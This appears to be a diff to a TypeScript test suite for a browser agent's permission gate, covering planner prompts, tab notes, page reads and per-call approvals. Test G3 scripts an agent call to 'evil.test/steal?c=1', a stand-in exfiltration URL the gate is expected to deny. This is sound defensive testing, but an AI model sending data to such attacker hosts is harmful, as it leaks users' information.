@@ -108,6 +108,10 @@ async function setup(options: { recall?: () => Promise<never>; publicSuffix?: { 
 }
 
 const finish = { tool: "finish", args: { summary: "Done." } };
+type Sent = { role: string; content: string | null; tool_call_id?: string };
+const sent = (request: string | undefined) => JSON.parse(request ?? "[]") as Sent[];
+/** The newest tab note in a request to the planner (G23, G31). */
+const tabNote = (request: string | undefined) => sent(request).findLast((m) => m.role === "user" && m.content?.startsWith("The open tab"))?.content ?? "";
 const openSite = (url: string) => ({ tool: "open_site", args: { url } });
 const open = (n: number) => ({ tool: "open_url", args: { url: `https://site${n}.test/` } });
 
@@ -132,7 +136,7 @@ describe("agent", () => {
   it("G3: another host gets no grant", async () => {
     const { run, ran, events } = await setup();
     await run({ script: [{ tool: "open_url", args: { url: "http://evil.test/steal?c=1" } }, finish] });
-    expect(events.find((e) => e.type === "decision")).toMatchObject({ decision: "deny", reason: "no-grant" });
+    expect(events.find((e) => e.type === "decision" && e.action?.tool === "open_url")).toMatchObject({ decision: "deny", reason: "no-grant" });
     expect(ran).toEqual([]);
   });
 
@@ -290,21 +294,66 @@ describe("agent", () => {
   it("G23: each planner request names the open tab, the allowed sites, and says to work on the open page", async () => {
     const { run, requests } = await setup();
     await run({ script: [{ tool: "snapshot", args: {} }, finish] });
-    const system = (JSON.parse(requests[0] ?? "[]") as { role: string; content: string }[])[0];
+    const system = sent(requests[0])[0];
     expect(system?.role).toBe("system");
-    expect(system?.content).toContain("http://shop.test/cart");
-    expect(system?.content).toContain('"Your cart"');
-    expect(system?.content).toMatch(/sites this run may use: shop\.test/i);
     expect(system?.content).toMatch(/work on the open page/i);
     expect(system?.content).toMatch(/do not make up/i);
+    const note = tabNote(requests[0]);
+    expect(note).toContain("http://shop.test/cart");
+    expect(note).toContain('"Your cart"');
+    expect(note).toMatch(/sites this run may use: shop\.test/i);
     expect(requests.length).toBe(2);
+  });
+
+  it("G31: each request starts with the request before it, unchanged; a tab note goes only at the end, when the tab changes", async () => {
+    const { run, requests } = await setup();
+    const end = await run({ noTab: true, script: [openSite("https://shop.test/"), { tool: "snapshot", args: {} }, { tool: "snapshot", args: {} }, finish] });
+    expect(end.status).toBe("done");
+    expect(requests.length).toBe(4);
+    const all = requests.map(sent);
+    for (const [i, messages] of all.entries()) {
+      expect(messages[0]).toEqual(all[0]![0]);
+      expect(messages[1]).toEqual(all[0]![1]);
+      if (i) expect(messages.slice(0, all[i - 1]!.length)).toEqual(all[i - 1]);
+    }
+    expect(all[0]![0]?.content).not.toContain("The open tab");
+    const notes = all.at(-1)!.filter((m) => m.role === "user" && m.content?.startsWith("The open tab"));
+    expect(notes.length).toBe(2);
+    expect(notes[0]?.content).toMatch(/no web page/);
+    expect(notes[1]?.content).toContain("https://shop.test/");
+    expect(notes[1]?.content).toMatch(/sites this run may use: shop\.test/i);
+  });
+
+  it("G32: the run reads the page before the first planner call; a run with no page does not", async () => {
+    const { run, requests, grantsSeen } = await setup();
+    await run({ script: [finish] });
+    expect(grantsSeen.length).toBe(1);
+    expect(sent(requests[0]).some((m) => m.role === "tool" && m.content?.includes("A page."))).toBe(true);
+    const none = await setup();
+    await none.run({ noTab: true, script: [finish] });
+    expect(none.grantsSeen).toEqual([]);
+    expect(sent(none.requests[0]).some((m) => m.role === "tool")).toBe(false);
+  });
+
+  it("G33: several calls in one reply each get their own approval, in order; a Deny stops the rest", async () => {
+    const goal = "Book a table for Friday";
+    const batch = { batch: [{ tool: "fill", args: { text: "a" } }, { tool: "fill", args: { text: "b" } }] };
+    const ok = await setup();
+    expect(await ok.run({ goal, script: [batch, finish] })).toMatchObject({ status: "done" });
+    const asked = ok.events.filter((e) => e.type === "approval-needed");
+    expect(asked.map((e) => e.type === "approval-needed" && e.action.args)).toEqual([{ text: "a" }, { text: "b" }]);
+    expect(new Set(asked.map((e) => e.type === "approval-needed" && e.requestId)).size).toBe(2);
+    expect(ok.ran.map((r) => r.args.text)).toEqual(["a", "b"]);
+    const no = await setup();
+    expect(await no.run({ goal, script: [batch, finish] }, "deny")).toMatchObject({ status: "blocked", reason: "approval-denied" });
+    expect(no.events.filter((e) => e.type === "approval-needed").length).toBe(1);
+    expect(no.ran).toEqual([]);
   });
 
   it("G24: the title is cut, on one line, with no angle brackets; the address has no query or fragment", async () => {
     const { run, requests } = await setup();
     await run({ tabId: 5, script: [{ tool: "snapshot", args: {} }, finish] });
-    const system = (JSON.parse(requests[0] ?? "[]") as { content: string }[])[0]?.content ?? "";
-    const context = system.slice(system.indexOf("The open tab"));
+    const context = tabNote(requests[0]);
     expect(context).not.toMatch(/[<>]/);
     expect(context).not.toContain("s3cret");
     expect(context).not.toContain("#pay");
@@ -331,7 +380,7 @@ describe("agent", () => {
     const end = await run({ script: [{ tool: "open_url", args: { url: "https://www.kayak.com/" } }, { tool: "snapshot", args: {} }, finish] });
     expect(end.status).toBe("done");
     expect(ran).toEqual([]);
-    expect(events.find((e) => e.type === "tool-result")).toMatchObject({ name: "open_url", ok: false, reason: "gate-deny" });
+    expect(events.find((e) => e.type === "tool-result" && e.name === "open_url")).toMatchObject({ ok: false, reason: "gate-deny" });
     expect(requests[1]).toContain("no-grant");
     expect((await trail.entries()).some((e) => e.kind === "loop.decision" && (e.data as { decision?: string }).decision === "deny")).toBe(true);
   });
@@ -424,9 +473,8 @@ describe("agent", () => {
     expect(end.status).toBe("blocked");
     expect(ran).toEqual([]);
     expect(grantsSeen).toEqual([]);
-    const system = (JSON.parse(requests[0] ?? "[]") as { content: string }[])[0]?.content ?? "";
-    expect(system).toMatch(/no web page/);
-    expect(system).toMatch(/open_site/);
+    expect(tabNote(requests[0])).toMatch(/no web page/);
+    expect(sent(requests[0])[0]?.content).toMatch(/open_site/);
   });
 
   it("OS8: a page that does not load gets no grant", async () => {
